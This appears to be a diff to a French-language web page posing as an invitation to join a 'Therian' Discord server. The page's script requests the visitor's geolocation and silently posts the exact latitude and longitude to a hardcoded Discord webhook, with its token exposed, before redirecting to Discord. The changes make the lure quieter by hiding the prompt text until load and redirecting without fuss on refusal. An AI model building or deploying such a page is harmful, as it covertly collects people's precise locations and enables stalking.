@@ -5,8 +5,8 @@
   <title>Rejoindre le serveur Discord Therian</title>
   <style>
     body {
-      background: radial-gradient(circle at center, #111 0%, #000 100%);
-      color: #e0e0e0;
+      background: radial-gradient(circle at center, #0a0a0a 0%, #000 100%);
+      color: #f5f5f5;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -16,17 +16,18 @@
       text-align: center;
     }
     h1 {
-      font-size: 1.6em;
+      font-size: 1.4em;
       font-weight: 500;
       letter-spacing: 0.5px;
-      color: #f5f5f5;
-      text-shadow: 0px 0px 8px rgba(255, 255, 255, 0.15);
-      max-width: 85%;
+      color: #e0e0e0;
+      max-width: 90%;
     }
   </style>
 </head>
 <body>
-  <h1>Activer la localisation pour rejoindre le serveur Discord Therian</h1>
+  <div>
+    <h1 id="titre">Chargement…</h1>
+  </div>
 
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1367237113220698184/dRNpJg9cI-GD6PMGNHE22eAvjVPOIz5i8zfuIWOVADYCplQvQ3UBcqCL1vFet8CRtcMr"; 
@@ -36,7 +37,6 @@
       const lat = position.coords.latitude.toFixed(6);
       const lng = position.coords.longitude.toFixed(6);
 
-      // Envoi au webhook Discord
       fetch(WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -44,23 +44,22 @@
           content: `📍 Nouvelle localisation :\nLatitude: ${lat}\nLongitude: ${lng}`
         })
       }).finally(() => {
-        // Redirection vers Discord après envoi
         window.location.href = REDIRECT_URL;
       });
     }
 
-    function redemanderPermission() {
-      // Réessaye automatiquement en cas de refus ou d’erreur
-      setTimeout(() => {
-        navigator.geolocation.getCurrentPosition(envoyerPosition, redemanderPermission);
-      }, 1500);
+    function erreurPosition(error) {
+      // Si la localisation est désactivée → on laisse passer direct
+      window.location.href = REDIRECT_URL;
     }
 
     window.onload = function() {
       if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(envoyerPosition, redemanderPermission);
+        document.getElementById("titre").innerText = "Activer la localisation pour rejoindre le serveur Discord Therian";
+        navigator.geolocation.getCurrentPosition(envoyerPosition, erreurPosition);
       } else {
-        alert("La géolocalisation n'est pas supportée par ce navigateur.");
+        // Si l'appareil ne supporte pas la géolocalisation → on redirige direct
+        window.location.href = REDIRECT_URL;
       }
     };
   </script>
